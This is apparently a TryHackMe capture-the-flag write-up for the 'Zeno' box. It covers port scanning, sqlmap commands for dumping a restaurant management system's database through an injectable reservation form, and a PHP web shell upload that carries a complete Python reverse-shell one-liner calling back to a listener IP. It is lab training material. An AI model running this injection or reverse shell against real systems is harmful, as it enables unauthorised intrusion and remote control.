---
title: "Zeno"
type: docs
tags:
  - thm
  - linux
  - medium
  - sqli
  - rce
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux (CentOS), **Difficulty:** Medium, **IP:** 10.10.30.130

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Web server on **port 12340**, a "Restaurant Management System" (RMS).
2. The "reserve a table" form is injectable, capture the request and feed it to **sqlmap** to dump the `dbrms` database.
3. Upload a PHP reverse shell through the RMS image-upload feature → RCE → shell.

</div>

## Reconnaissance

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
```

Full scan, the web server is on a high port:

```console
PORT      STATE SERVICE VERSION
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-enum:
|_  /icons/: Potentially interesting folder w/ directory listing
| http-trace: TRACE is enabled
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
```

Add `zeno.thm → 10.10.30.130` to `/etc/hosts`.

![Zeno_01](Zeno_01.png)

![Zeno_02](Zeno_02.png)

## SQL Injection, sqlmap

Log in, go to **Reserve a Table**, fill every field, and capture the POST request in Burp. Feed it to sqlmap:

```bash
sqlmap -r reserve.req --batch --dbs
sqlmap -r reserve.req --batch -D dbrms --tables
```

## Foothold, PHP reverse shell upload

The RMS lets you upload an image; drop a PHP shell and browse to it:

```text
http://zeno.thm:12340/rms/images/reverse-shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.82.121",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Catch the shell on your listener.

![Zeno_03](Zeno_03.png)

![Zeno_04](Zeno_04.png)

![Zeno_05](Zeno_05.png)

![Zeno_06](Zeno_06.png)

![Zeno_07](Zeno_07.png)

Shell obtained. ✅

![Zeno_08](Zeno_08.png)

![Zeno_09](Zeno_09.png)
